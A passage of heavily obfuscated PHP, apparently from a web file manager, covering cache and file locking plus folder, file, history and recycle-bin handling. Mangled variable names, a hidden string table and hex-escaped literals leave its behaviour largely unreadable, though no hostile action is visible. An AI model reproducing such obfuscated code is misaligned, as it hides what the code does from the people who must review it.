@unlink($…´æ¯ñî); return !1; } $¦æå´ÎÓ = @file_get_contents($…´æ¯ñî); return substr($¦æå´ÎÓ, strlen($this->prefix)); } public function remove($¤âÇ¤ğĞ) { $’ıêú³µ = $this->getFile($¤âÇ¤ğĞ); return @unlink($’ıêú³µ); } public function deleteAll() { $Òİ²ø =& $_SERVER[Ü©»’·]; $í¹‘ÙÅ¤ = scandir($this->cachePath); foreach ($í¹‘ÙÅ¤ as $ãÈ»õŞï) { $ù÷ŠÓæ› = $this->cachePath . $ãÈ»õŞï; if (strpos($ù÷ŠÓæ›, $Òİ²ø[844]) && strpos($ù÷ŠÓæ›, $Òİ²ø[845])) { @unlink($ù÷ŠÓæ›); } } } public function clearTimeout() { $¸‹±ùëÎ =& $_SERVER[Ü©»’·]; $è¶²ú = scandir($this->cachePath); foreach ($è¶²ú as $ƒÚ­àĞ‹) { $¾¾†êËÍ = $this->cachePath . $ƒÚ­àĞ‹; if (strpos($¾¾†êËÍ, $¸‹±ùëÎ[844]) && strpos($¾¾†êËÍ, $¸‹±ùëÎ[845]) && filemtime($¾¾†êËÍ) < time()) { @unlink($¾¾†êËÍ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $èÚ¢Ï¨ã =& $_SERVER[Ü©»’·]; if (self::$handle) { return self::$handle; } $ìÂƒËÈ = $GLOBALS[$èÚ¢Ï¨ã[6]][$èÚ¢Ï¨ã[349]]; self::$timeout = $ìÂƒËÈ[$èÚ¢Ï¨ã[846]] ? $ìÂƒËÈ[$èÚ¢Ï¨ã[846]] : 10; $Ò¶§á†« = _get($GLOBALS[$èÚ¢Ï¨ã[6]], $èÚ¢Ï¨ã[847]); $‚ü¸¿×¢ = $ìÂƒËÈ[$èÚ¢Ï¨ã[833]] ? $ìÂƒËÈ[$èÚ¢Ï¨ã[833]] : $èÚ¢Ï¨ã[199]; if ($‚ü¸¿×¢ == $èÚ¢Ï¨ã[21] && $Ò¶§á†« == $èÚ¢Ï¨ã[13]) { $‚ü¸¿×¢ = $èÚ¢Ï¨ã[199]; } switch ($‚ü¸¿×¢) { case $èÚ¢Ï¨ã[836]: self::$handle = new CacheLockRedis(); break; case $èÚ¢Ï¨ã[837]: self::$handle = new CacheLockMemcached(); break; case $èÚ¢Ï¨ã[21]: self::$handle = new CacheLockDatabase(); break; case $èÚ¢Ï¨ã[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($èÚ¢Ï¨ã[848], $èÚ¢Ï¨ã[849]); } return self::$handle; } private static function key($Šµ¡Ú­Ê) { return $_SERVER[Ü©»’·][850] . Cache::key($Šµ¡Ú­Ê); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Äø¸µ¦¢ = '') { self::$errorMsg = $Äø¸µ¦¢; } public static function lockGlobal($ÚËÀ…è, $Î´î€¯×) { return self::lock($ÚËÀ…è, $Î´î€¯×, !0); } public static function lock($¼”İ³î², $æŒ µÀ = false, $Œë€„ = false) { $İÊÚ‚™á =& $_SERVER[Ü©»’·]; $€ŒöİÛÜ = self::init(); $ò¯ñÌÍ‚ = self::key($¼”İ³î²); $æŒ µÀ = $æŒ µÀ ? $æŒ µÀ : self::$timeout; $åÃø­¿Ú = timeFloat(); $ëÓªÂ»’ = $€ŒöİÛÜ->lock($ò¯ñÌÍ‚, $æŒ µÀ); $Ş‹ëè®ˆ = timeFloat(); if (!$ëÓªÂ»’) { $à½ºàáÚ = "\x6c\x6f\x63\153\40\x65\x72\162\157\162\73\153\x65\171\x3d{$¼”İ³î²}\x3b\x74\151\x6d\x65\75{$æŒ µÀ}\73" . self::$errorMsg . $İÊÚ‚™á[71] . get_caller_msg(); $’Î‰ïô… = LNG($İÊÚ‚™á[851]) . "\x28{$æŒ µÀ}\163\x29\x2e" . LNG($İÊÚ‚™á[852]); $’Î‰ïô… .= $İÊÚ‚™á[853]; if (is_string(self::$errorMsg) && self::$errorMsg) { $’Î‰ïô… = $’Î‰ïô… . $İÊÚ‚™á[854] . self::$errorMsg; } write_log($İÊÚ‚™á[855] . sprintf($İÊÚ‚™á[856], timeFloat() - $åÃø­¿Ú) . $İÊÚ‚™á[857] . $à½ºàáÚ . $İÊÚ‚™á[858] . error_get_last(), $İÊÚ‚™á[849]); show_json($’Î‰ïô…, !1); } if (!$Œë€„) { self::$lockItem[$ò¯ñÌÍ‚] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ˆ²¤¨ç† = number_format(timeFloat() - $Ş‹ëè®ˆ, 3); write_log($İÊÚ‚™á[859] . $¼”İ³î² . $İÊÚ‚™á[860] . $ˆ²¤¨ç†, $İÊÚ‚™á[849]); } return $ëÓªÂ»’; } public static function lockGet($ã„‚×‚Æ) { $¬ÆüÉ§ = self::key($ã„‚×‚Æ); if (self::$lockItem[$¬ÆüÉ§]) { return self::$lockItem[$¬ÆüÉ§]; } return self::init()->lockGet($¬ÆüÉ§); } public static function unlock($¥ÛöóËõ) { $šË°Üó¢ =& $_SERVER[Ü©»’·]; $‘êö”ˆœ = self::key($¥ÛöóËõ); self::$lockItem[$‘êö”ˆœ] = null; self::init()->unlock($‘êö”ˆœ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($šË°Üó¢[861] . $¥ÛöóËõ, $šË°Üó¢[849]); } return; } public static function unlockRuntime() { $öä½ó‘ã =& $_SERVER[Ü©»’·]; $ÕÔª‚¤ = self::init(); $‡æ„ÖÔÓ = !1; foreach (self::$lockItem as $ÏÃ¨€å§ => $´ëÌñÊò) { if (!$´ëÌñÊò) { continue; } $ÕÔª‚¤->unlock($ÏÃ¨€å§); if (!$‡æ„ÖÔÓ) { $‡æ„ÖÔÓ = !0; write_log($öä½ó‘ã[862] . $ÏÃ¨€å§ . $öä½ó‘ã[71] . get_caller_msg(), $öä½ó‘ã[849]); continue; } write_log($öä½ó‘ã[862] . $ÏÃ¨€å§, $öä½ó‘ã[849]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¹Àù¯˜ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($öä½ó‘ã[863] . $¹Àù¯˜ . $öä½ó‘ã[864] . ACTION, $öä½ó‘ã[849]); } } public static function fileLock($›»õ—Ì) { $üä‚ÒŠ± =& $_SERVER[Ü©»’·]; if (!$GLOBALS[$üä‚ÒŠ±[865]]) { $GLOBALS[$üä‚ÒŠ±[865]] = array(); } $GLOBALS[$üä‚ÒŠ±[865]][$›»õ—Ì] = !1; $Ìºú°¡æ = fopen(DATA_PATH . $›»õ—Ì . $üä‚ÒŠ±[866], $üä‚ÒŠ±[867]); if (!$Ìºú°¡æ) { return !1; } $GLOBALS[$üä‚ÒŠ±[865]][$›»õ—Ì] = $Ìºú°¡æ; if (flock($Ìºú°¡æ, LOCK_EX)) { return !0; } self::unlock($›»õ—Ì); show_json($üä‚ÒŠ±[868], !1); return !1; } public static function fileUnlock($ÈÉŒïšû) { $¤ÚŸÏüÙ =& $_SERVER[Ü©»’·]; $ùåì¸Ë” = $GLOBALS[$¤ÚŸÏüÙ[865]][$ÈÉŒïšû]; if (!$ùåì¸Ë”) { return; } $GLOBALS[$¤ÚŸÏüÙ[865]][$ÈÉŒïšû] = !1; flock($ùåì¸Ë”, LOCK_UN); fclose($ùåì¸Ë”); } public static function fileUnlockAll() { $ôÍÂÎ© =& $_SERVER[Ü©»’·]; if (!$GLOBALS[$ôÍÂÎ©[865]]) { return; } foreach ($GLOBALS[$ôÍÂÎ©[865]] as $ÏŸáÎ®’ => $ÃÄÓ×ó) { if (!$ÃÄÓ×ó) { continue; } $GLOBALS[$ôÍÂÎ©[865]][$ÏŸáÎ®’] = !1; flock($ÃÄÓ×ó, LOCK_UN); fclose($ÃÄÓ×ó); } $GLOBALS[$ôÍÂÎ©[865]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto bÒ’®Ü£; E«óğßğ : class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ç¨Ÿ´) { $ïØ¨û†ë =& $_SERVER[Ü©»’·]; $‰™¹ªšé = Model($ïØ¨û†ë[522])->where(array($ïØ¨û†ë[1660] => $ç¨Ÿ´))->find(); $šâç¶› = $this->_mkdirRoot(SourceModel::TYPE_USER, $ç¨Ÿ´, $‰™¹ªšé[$ïØ¨û†ë[32]]); $this->userDesktopAdd($šâç¶›); return $šâç¶›; } public function userDesktopAdd($ß‰û¶ÉÃ) { $òª‚Œ¶ê =& $_SERVER[Ü©»’·]; $şœò«¤ = LNG($òª‚Œ¶ê[2126]); $±Ù·ı€à = $this->mkdir($ß‰û¶ÉÃ, $şœò«¤); $this->metaSet($±Ù·ı€à, $òª‚Œ¶ê[2127], $òª‚Œ¶ê[88]); $this->metaSet($ß‰û¶ÉÃ, $òª‚Œ¶ê[2128], $±Ù·ı€à); } public function userPathSafeAdd($“°ãù‚†) { $¹ùÅ”ü =& $_SERVER[Ü©»’·]; $Å­ğõ¬ü = Model($¹ùÅ”ü[522])->getInfoFull($“°ãù‚†); if (!$Å­ğõ¬ü) { return !1; } if (_get($Å­ğõ¬ü, $¹ùÅ”ü[545])) { return $Å­ğõ¬ü[$¹ùÅ”ü[475]][$¹ùÅ”ü[2129]]; } $ôµ…„™ = $this->_mkdirRoot(SourceModel::TYPE_USER, $“°ãù‚†, $¹ùÅ”ü[2130], $¹ùÅ”ü[442]); Model($¹ùÅ”ü[522])->metaSet($“°ãù‚†, $¹ùÅ”ü[2129], $ôµ…„™); $this->metaSet($ôµ…„™, $¹ùÅ”ü[2131], $“°ãù‚†); return $ôµ…„™; } public function groupRootAdd($àº–©Ûá) { $š Š›Šô =& $_SERVER[Ü©»’·]; $À¯’£Ç± = Model($š Š›Šô[531])->where(array($š Š›Šô[1946] => $àº–©Ûá))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $àº–©Ûá, $À¯’£Ç±[$š Š›Šô[32]]); } public function systemRootPathAdd($ÍºŒ·ïŒ) { if ($ÍºŒ·ïŒ != $_SERVER[Ü©»’·][553]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÍºŒ·ïŒ); } public function userRootRemove($êœöåæÖ) { $…«¥ä½ = $this->targetSourceRoot(SourceModel::TYPE_USER, $êœöåæÖ, !0); foreach ($…«¥ä½ as $Ê—½¿‹ª) { if (!$Ê—½¿‹ª) { continue; } $this->remove($Ê—½¿‹ª[$_SERVER[Ü©»’·][411]], !1); } } public function groupRootRemove($Ëœ®˜ªø) { $©ÉĞÖè¼ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ëœ®˜ªø); if (!$©ÉĞÖè¼) { return; } $this->remove($©ÉĞÖè¼[$_SERVER[Ü©»’·][411]], !1); } private function _mkdirRoot($ùÕ«ı—¤, $£â§¾–Ç, $¶øŞÄ ¤, $Éó³–‹ = '') { $ıâÁí´¯ =& $_SERVER[Ü©»’·]; $ùŸæÂÑ™ = array($ıâÁí´¯[410] => 0, $ıâÁí´¯[595] => $ùÕ«ı—¤, $ıâÁí´¯[596] => $£â§¾–Ç, $ıâÁí´¯[592] => 1, $ıâÁí´¯[597] => USER_ID, $ıâÁí´¯[598] => USER_ID, $ıâÁí´¯[593] => $Éó³–‹, $ıâÁí´¯[599] => $ıâÁí´¯[540], $ıâÁí´¯[439] => 0, $ıâÁí´¯[594] => 0, $ıâÁí´¯[478] => 0, $ıâÁí´¯[600] => $ıâÁí´¯[12]); if ($Î‹ß·Õ‰ = $this->where($ùŸæÂÑ™)->find()) { return $Î‹ß·Õ‰[$ıâÁí´¯[411]]; } $ºÙâÕ­ = "\115\x6f\x64\x65\x6c\123\157\165\x72\x63\145\56\155\x6b\x64\151\162\x52\157\157\164\x2e{$ùÕ«ı—¤}\56{$£â§¾–Ç}\x2e" . $¶øŞÄ ¤; CacheLock::lock($ºÙâÕ­); $ùŸæÂÑ™[$ıâÁí´¯[32]] = $¶øŞÄ ¤; $×Èø×ô = $this->add($ùŸæÂÑ™); $´“ç¿¯Æ = array($ıâÁí´¯[601] => short_id($×Èø×ô)); $this->where(array($ıâÁí´¯[426] => $×Èø×ô))->save($´“ç¿¯Æ); CacheLock::unlock($ºÙâÕ­); return $×Èø×ô; } private function targetSourceRoot($™çàØşˆ, $Ùø±¹ç, $îŠı¿â = false) { $¨·òêÕ =& $_SERVER[Ü©»’·]; $ŸĞ€‘æş = array($¨·òêÕ[410] => 0, $¨·òêÕ[595] => $™çàØşˆ, $¨·òêÕ[596] => $Ùø±¹ç); if ($îŠı¿â) { $ÚÜÒÎ¨È = $this->where($ŸĞ€‘æş)->select(); return $ÚÜÒÎ¨È ? $ÚÜÒÎ¨È : array(); } $ÙûÇ·Öˆ = $this->where($ŸĞ€‘æş)->find(); return $ÙûÇ·Öˆ ? $ÙûÇ·Öˆ : array(); } public function sourceRootGroup($²¢“ÑˆØ) { $…‰¾ğˆİ =& $_SERVER[Ü©»’·]; if (is_string($²¢“ÑˆØ)) { $²¢“ÑˆØ = array($²¢“ÑˆØ); } $Œ½óÓôÈ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $²¢“ÑˆØ, $…‰¾ğˆİ[188]); $ìŒ¼§‹ú = array($…‰¾ğˆİ[378] => $Œ½óÓôÈ, $…‰¾ğˆİ[375] => array($…‰¾ğˆİ[765] => count($²¢“ÑˆØ))); $this->_listDataApply($ìŒ¼§‹ú[$…‰¾ğˆİ[378]]); $this->_listMake($ìŒ¼§‹ú); return array_to_keyvalue($ìŒ¼§‹ú[$…‰¾ğˆİ[82]], $…‰¾ğˆİ[514]); } public function mkfile($‡·Îïº, $¸Ì°—„€, $À¡àë’ = '', $åÃìŞìù = REPEAT_RENAME) { $¤ŒõÉ¢¯ =& $_SERVER[Ü©»’·]; $°şº²ªÅ = Model($¤ŒõÉ¢¯[618])->addFileByContent($À¡àë’, $¸Ì°—„€); return $this->_createFileCall($‡·Îïº, $¸Ì°—„€, $°şº²ªÅ, $åÃìŞìù, $¤ŒõÉ¢¯[1350]); } public function addFile($İúÄİ¯Ø, $Û›Ëù’í, $‹©‹–÷ˆ, $³§ªï½û = false, $æñê¨ŒĞ = REPEAT_RENAME) { $åÇÕá·´ = Model($_SERVER[Ü©»’·][618])->addFile($Û›Ëù’í, $‹©‹–÷ˆ, $³§ªï½û); return $this->_createFileCall($İúÄİ¯Ø, $‹©‹–÷ˆ, $åÇÕá·´, $æñê¨ŒĞ); } public function addFileByFileID($… ÕğŸì, $ ‹¡¡úí, $ìä¸õ‚ò, $™õøìëë = REPEAT_RENAME) { $‡§¢ôûÚ =& $_SERVER[Ü©»’·]; $Í¯Ò’¿º = Model($‡§¢ôûÚ[618])->find($ ‹¡¡úí); Model($‡§¢ôûÚ[618])->linkAdd($ ‹¡¡úí); return $this->_createFileCall($… ÕğŸì, $ìä¸õ‚ò, $Í¯Ò’¿º, $™õøìëë); } public function addFileByRemote($©®¤ìÊï, $‡“‘´ˆ, $‚ Šè½, $ÆşíŞœ = array(), $…Öêğ¹ê = REPEAT_RENAME) { $Ÿí°‚Á™ = Model($_SERVER[Ü©»’·][618])->addFileByRemote($‡“‘´ˆ, $‚ Šè½, $ÆşíŞœ); return $this->_createFileCall($©®¤ìÊï, $‚ Šè½, $Ÿí°‚Á™, $…Öêğ¹ê); } private function _createFileCall($…­ïã¢ì, $ñ„ª´§è, $ˆ¿”ò§´, $‘·Âà©º, $¿®ãöü = "\x75\160\x6c\157\141\x64") { $Øº¾Ğš‹ =& $_SERVER[Ü©»’·]; $¾¿¾¤œ€ = !1; $this->setMasterDB(); $this->lockWriteStart($…­ïã¢ì, $ñ„ª´§è); $ß‡”ÙÌù = $this->fileNameExist($…­ïã¢ì, $ñ„ª´§è); $Œ„¡ƒ©Ÿ = $this->_createFile($…­ïã¢ì, $ñ„ª´§è, $ˆ¿”ò§´, $‘·Âà©º, $¾¿¾¤œ€); if (!$¾¿¾¤œ€) { Model($Øº¾Ğš‹[480])->remove($ˆ¿”ò§´[$Øº¾Ğš‹[477]]); } if ($¾¿¾¤œ€ && $Œ„¡ƒ©Ÿ && $Œ„¡ƒ©Ÿ != $ß‡”ÙÌù) { Model($Øº¾Ğš‹[2099])->eventCreate($Œ„¡ƒ©Ÿ, $¿®ãöü); } $this->lockWriteEnd($…­ïã¢ì, $ñ„ª´§è); return $Œ„¡ƒ©Ÿ; } public function mkdir($´¤˜©½û, $ˆ±Ó‰÷¶, $œ„²˜ = REPEAT_SKIP) { $¦×ü·øÂ =& $_SERVER[Ü©»’·]; $this->setMasterDB(); $åî”‚îæ = $this->sourceInfo($´¤˜©½û); if (!$åî”‚îæ) { return !1; } $this->lockWriteStart($´¤˜©½û, $ˆ±Ó‰÷¶); if ($œ„²˜ !== !1) { $€İ„±™ù = $this->fileNameExist($´¤˜©½û, $ˆ±Ó‰÷¶); if ($€İ„±™ù && $œ„²˜ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($´¤˜©½û, $ˆ±Ó‰÷¶); return $€İ„±™ù; } $ˆ±Ó‰÷¶ = $this->fileNameAuto($´¤˜©½û, $ˆ±Ó‰÷¶, $œ„²˜); } $µ¡ÔÕƒ = array($¦×ü·øÂ[592] => 1, $¦×ü·øÂ[429] => $ˆ±Ó‰÷¶, $¦×ü·øÂ[593] => $¦×ü·øÂ[12], $¦×ü·øÂ[478] => 0, $¦×ü·øÂ[594] => 0); $±ÊáÀş’ = $this->_addSource($µ¡ÔÕƒ, $åî”‚îæ); Model($¦×ü·øÂ[2099])->eventCreate($±ÊáÀş’, $¦×ü·øÂ[1351]); $this->lockWriteEnd($´¤˜©½û, $ˆ±Ó‰÷¶); return $±ÊáÀş’; } public function listSourceRoot($‡®Šš”‰, $²šö³, $ãüÔ¥ôË = "\x73\157\165\x72\143\145\111\104\x2c\164\141\162\x67\145\164\111\x44\54\163\151\172\x65") { $³ãĞÎñ =& $_SERVER[Ü©»’·]; $ûƒŞåÆ = $³ãĞÎñ[387]; $ºâÀìı³ = array(); $ŒÔã½« = 1024 * 50; $Âï¦€¿Ÿ = is_array($Âï¦€¿Ÿ) ? $Âï¦€¿Ÿ : array(); $ ıÜ¼±¶ = count($²šö³); $è¶×¦Üè = $this->tablePrefix . $³ãĞÎñ[2132]; for ($ñ¶§¡ˆ = 0; $ñ¶§¡ˆ < $ ıÜ¼±¶; $ñ¶§¡ˆ++) { $â±Ò¾ÖÕ = $²šö³[$ñ¶§¡ˆ]; $ûƒŞåÆ .= "\x53\x45\x4c\x45\x43\124\x20\x2a\x20\x46\122\117\x4d\x20\50\x53\x45\114\x45\x43\x54\40{$ãüÔ¥ôË}\40\x46\x52\117\x4d\x20\140{$è¶×¦Üè}\x60\x20\127\x48\105\x52\105\40"; $ûƒŞåÆ .= "\x60\x70\141\x72\x65\156\164\111\x44\140\75\60\x20\x41\x4e\x44\40\140\x74\x61\x72\x67\145\x74\111\x44\140\75{$â±Ò¾ÖÕ}\40\101\x4e\104\x20\140\164\x61\x72\x67\x65\164\124\x79\x70\x65\140\x3d{$‡®Šš”‰}\x20\141\156\x64\40\146\151\154\x65\x54\x79\x70\x65\75\x27\47\x20\x6c\151\155\x69\164\40\61\x29\40\141\x73\x20\x74\x62\137{$ñ¶§¡ˆ}\x20\125\x4e\111\117\116\40\x41\x4c\114\40"; if ((strlen($ûƒŞåÆ) >= $ŒÔã½« || $ñ¶§¡ˆ == $ ıÜ¼±¶ - 1) && $ûƒŞåÆ) { $ûƒŞåÆ = substr($ûƒŞåÆ, 0, -strlen($³ãĞÎñ[1041])); $¸‹õƒÏù = $this->query($ûƒŞåÆ); $ûƒŞåÆ = $³ãĞÎñ[12]; $ºâÀìı³ = array_merge($ºâÀìı³, $¸‹õƒÏù); } } return $ºâÀìı³; } private function _createFile($ìê†Õßº, $£î”¾ã§, $æÒÑ¹Š, $£É÷¥Ø¤, &$¦¹‘òı) { $¹ı²ÆÃ =& $_SERVER[Ü©»’·]; $Â©óÕı« = $this->sourceInfo($ìê†Õßº); if (!$æÒÑ¹Š || !$Â©óÕı«) { return !1; } if ($£É÷¥Ø¤ !== !1) { $¸—îñË¦ = $this->fileNameExist($ìê†Õßº, $£î”¾ã§); } $¦¹‘òı = !0; if ($£É÷¥Ø¤ && $¸—îñË¦) { if ($£É÷¥Ø¤ == REPEAT_SKIP) { $¦¹‘òı = !1; return $¸—îñË¦; } else { if ($£É÷¥Ø¤ == REPEAT_REPLACE) { $¥ş“ÍÃ = $this->sourceInfo($¸—îñË¦); $ ¬²×»´ = $this->fileHistory($¥ş“ÍÃ, $æÒÑ¹Š[$¹ı²ÆÃ[477]], $æÒÑ¹Š[$¹ı²ÆÃ[76]]); if (!$ ¬²×»´) { $¦¹‘òı = !1; } else { $this->folderSizeReset($ìê†Õßº); } return $¸—îñË¦; } else { $£î”¾ã§ = $this->fileNameAuto($ìê†Õßº, $£î”¾ã§, $£É÷¥Ø¤, !1); } } } $Û¤¹ªî‚ = array($¹ı²ÆÃ[592] => 0, $¹ı²ÆÃ[429] => $£î”¾ã§, $¹ı²ÆÃ[593] => substr(get_path_ext($£î”¾ã§), 0, 10), $¹ı²ÆÃ[478] => $æÒÑ¹Š[$¹ı²ÆÃ[477]], $¹ı²ÆÃ[594] => $æÒÑ¹Š[$¹ı²ÆÃ[76]]); $â££íÚ§ = $this->_addSource($Û¤¹ªî‚, $Â©óÕı«); $this->folderSizeReset($ìê†Õßº, intval($Û¤¹ªî‚[$¹ı²ÆÃ[76]])); return $â££íÚ§; } protected function fileHistory($¯Şİì›“, $”ûƒâ÷Ï, $Ñ×äÁËˆ) { $ÈóÑó¢” =& $_SERVER[Ü©»’·]; $Üù¬µ„÷ = defined($ÈóÑó¢”[484]) ? USER_ID : $ÈóÑó¢”[197]; if ($¯Şİì›“[$ÈóÑó¢”[477]] == $”ûƒâ÷Ï) { return !1; } $this->checkLock($¯Şİì›“[$ÈóÑó¢”[411]], $”ûƒâ÷Ï); Model($ÈóÑó¢”[2133])->addHistory($¯Şİì›“); $’ÉÁ…âˆ = array($ÈóÑó¢”[598] => $Üù¬µ„÷, $ÈóÑó¢”[433] => time(), $ÈóÑó¢”[477] => $”ûƒâ÷Ï, $ÈóÑó¢”[76] => $Ñ×äÁËˆ); $this->where(array($ÈóÑó¢”[426] => $¯Şİì›“[$ÈóÑó¢”[411]]))->save($’ÉÁ…âˆ); $this->sourceCacheClear($¯Şİì›“[$ÈóÑó¢”[411]]); return !0; } public function checkLock($û•ìœä, $½ƒ¡Âú÷) { $Ğ½«…ÎÆ =& $_SERVER[Ü©»’·]; $´°œ‹½À = $this->pathInfo($û•ìœä); if (!$this->fileIsLock($´°œ‹½À, !0)) { return; } $¯¼Ô´Ÿñ = Session::get($Ğ½«…ÎÆ[2134]); $íâÈÓÕğ = substr($´°œ‹½À[$Ğ½«…ÎÆ[32]], 0, -1 - strlen($´°œ‹½À[$Ğ½«…ÎÆ[174]])) . $Ğ½«…ÎÆ[1212] . $¯¼Ô´Ÿñ . $Ğ½«…ÎÆ[10] . $´°œ‹½À[$Ğ½«…ÎÆ[174]]; $’¦ö¸•ï = Model($Ğ½«…ÎÆ[618])->find($½ƒ¡Âú÷); $this->_createFileCall($´°œ‹½À[$Ğ½«…ÎÆ[441]], $íâÈÓÕğ, $’¦ö¸•ï, REPEAT_REPLACE, $Ğ½«…ÎÆ[1350]); $É×ª™ª = $´°œ‹½À[$Ğ½«…ÎÆ[475]][$Ğ½«…ÎÆ[557]]; $¸„üÄÒí = $É×ª™ª[$Ğ½«…ÎÆ[551]] ? $É×ª™ª[$Ğ½«…ÎÆ[551]] : $É×ª™ª[$Ğ½«…ÎÆ[32]]; show_json(LNG($Ğ½«…ÎÆ[2135]) . $Ğ½«…ÎÆ[2136] . LNG($Ğ½«…ÎÆ[2137]) . $Ğ½«…ÎÆ[2138] . $¸„üÄÒí . $Ğ½«…ÎÆ[2139], !1); } public function fileIsLock($çåÂÈºº, $³û‘–¼Ç = false) { $Âä„ëÈ“ =& $_SERVER[Ü©»’·]; if (!isset($çåÂÈºº[$Âä„ëÈ“[475]]) || !$çåÂÈºº[$Âä„ëÈ“[475]][$Âä„ëÈ“[554]]) { return !1; } if ($çåÂÈºº[$Âä„ëÈ“[475]][$Âä„ëÈ“[554]] != USER_ID) { return !0; } $š§¤ô¶” = $GLOBALS[$Âä„ëÈ“[6]][$Âä„ëÈ“[89]][$Âä„ëÈ“[555]]; if ($çåÂÈºº[$Âä„ëÈ“[475]][$Âä„ëÈ“[556]] <= time() - $š§¤ô¶”) { $this->metaSet($çåÂÈºº[$Âä„ëÈ“[411]], $Âä„ëÈ“[554], null); $this->metaSet($çåÂÈºº[$Âä„ëÈ“[411]], $Âä„ëÈ“[556], null); } if ($³û‘–¼Ç) { $this->metaSet($çåÂÈºº[$Âä„ëÈ“[411]], $Âä„ëÈ“[556], time()); } return !1; } private function _addSource($à×Ìà¤‘, $šÂ¼õü) { $¯¼¹¤µˆ =& $_SERVER[Ü©»’·]; $áÕüÀ = defined($¯¼¹¤µˆ[484]) ? USER_ID : $¯¼¹¤µˆ[197]; $ïÁúÇ–Ù = array($¯¼¹¤µˆ[595] => $šÂ¼õü[$¯¼¹¤µˆ[420]], $¯¼¹¤µˆ[596] => $šÂ¼õü[$¯¼¹¤µˆ[514]], $¯¼¹¤µˆ[597] => $áÕüÀ, $¯¼¹¤µˆ[598] => $áÕüÀ, $¯¼¹¤µˆ[410] => $šÂ¼õü[$¯¼¹¤µˆ[411]], $¯¼¹¤µˆ[599] => $šÂ¼õü[$¯¼¹¤µˆ[530]] . $šÂ¼õü[$¯¼¹¤µˆ[411]] . $¯¼¹¤µˆ[50], $¯¼¹¤µˆ[439] => 0, $¯¼¹¤µˆ[600] => $¯¼¹¤µˆ[12]); $à×Ìà¤‘ = array_merge($ïÁúÇ–Ù, $à×Ìà¤‘); $this->updateModifyTime($à×Ìà¤‘[$¯¼¹¤µˆ[441]]); $ù‡—ÙÎİ = $¯¼¹¤µˆ[2140] . $šÂ¼õü[$¯¼¹¤µˆ[411]]; if (isset(self::$cacheChildList[$ù‡—ÙÎİ])) { unset(self::$cacheChildList[$ù‡—ÙÎİ]); } static $ÂÊâÄ‘ = false; if (!$ÂÊâÄ‘) { Hook::trigger($¯¼¹¤µˆ[582], $à×Ìà¤‘); $ÂÊâÄ‘ = !0; } $í˜”™‘¼ = $this->add($à×Ìà¤‘); $¼ßş¤¢— = array($¯¼¹¤µˆ[601] => short_id($í˜”™‘¼)); $this->where(array($¯¼¹¤µˆ[426] => $í˜”™‘¼))->save($¼ßş¤¢—); $this->setNamePinyin($í˜”™‘¼, $à×Ìà¤‘[$¯¼¹¤µˆ[32]]); return $í˜”™‘¼; } public function remove($øÉÃ÷¡î, $ÆºŒîı = true) { $”ø€Ëû =& $_SERVER[Ü©»’·]; $ıÉ¾¼ü¸ = $this->sourceInfo($øÉÃ÷¡î); $¹™¼´Õı = intval($ıÉ¾¼ü¸[$”ø€Ëû[420]]) === self::TYPE_SYSTEM; $€¤–Ä§Ÿ = Model($”ø€Ëû[444])->get($”ø€Ëû[2141]) == $”ø€Ëû[88]; if ($¹™¼´Õı || $ÆºŒîı || !$€¤–Ä§Ÿ) { return $this->removeNow($øÉÃ÷¡î, $ÆºŒîı); } $ôÖ§ÑÙâ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¸Õâ‚Á½ = $ıÉ¾¼ü¸[$”ø€Ëû[420]] == self::TYPE_USER ? $”ø€Ëû[609] : $”ø€Ëû[524]; if ($¸Õâ‚Á½ == $”ø€Ëû[609]) { $üúˆÕ‚ = Model($”ø€Ëû[522])->getInfo($ıÉ¾¼ü¸[$”ø€Ëû[514]]); $çŞ‡…ô  = !empty($üúˆÕ‚[$”ø€Ëû[551]]) ? $üúˆÕ‚[$”ø€Ëû[551]] : $üúˆÕ‚[$”ø€Ëû[32]]; $çŞ‡…ô  = $”ø€Ëû[260] . $çŞ‡…ô  . $”ø€Ëû[2142] . $ıÉ¾¼ü¸[$”ø€Ëû[514]]; } else { $üúˆÕ‚ = Model($”ø€Ëû[531])->getInfo($ıÉ¾¼ü¸[$”ø€Ëû[514]]); $çŞ‡…ô  = _get($üúˆÕ‚, $”ø€Ëû[32]); $çŞ‡…ô  = $”ø€Ëû[162] . $çŞ‡…ô  . $”ø€Ëû[2143] . $ıÉ¾¼ü¸[$”ø€Ëû[514]]; } $Ì¶¢şêÒ = $”ø€Ëû[2144] . md5($çŞ‡…ô ); CacheLock::lock($Ì¶¢şêÒ); $™÷ù…ƒÆ = $this->fileNameExist($ôÖ§ÑÙâ, $çŞ‡…ô ); if (!$™÷ù…ƒÆ) { $™÷ù…ƒÆ = $this->mkdir($ôÖ§ÑÙâ, $çŞ‡…ô , REPEAT_SKIP); $this->metaSet($™÷ù…ƒÆ, $”ø€Ëû[2145], $¸Õâ‚Á½); $this->metaSet($™÷ù…ƒÆ, $”ø€Ëû[2146], $ıÉ¾¼ü¸[$”ø€Ëû[514]]); if ($ıÉ¾¼ü¸[$”ø€Ëû[441]] != 0) { $this->metaSet($™÷ù…ƒÆ, $”ø€Ëû[2147], _get($üúˆÕ‚, $”ø€Ëû[2148])); } } CacheLock::unlock($Ì¶¢şêÒ); $this->metaSet($øÉÃ÷¡î, $”ø€Ëû[2149], $ıÉ¾¼ü¸[$”ø€Ëû[441]]); $this->where(array($”ø€Ëû[411] => $øÉÃ÷¡î))->save(array($”ø€Ëû[433] => time())); $this->recycleClear($ıÉ¾¼ü¸); $ÈÏˆ’× = $this->move($øÉÃ÷¡î, $™÷ù…ƒÆ, REPEAT_RENAME_FOLDER); 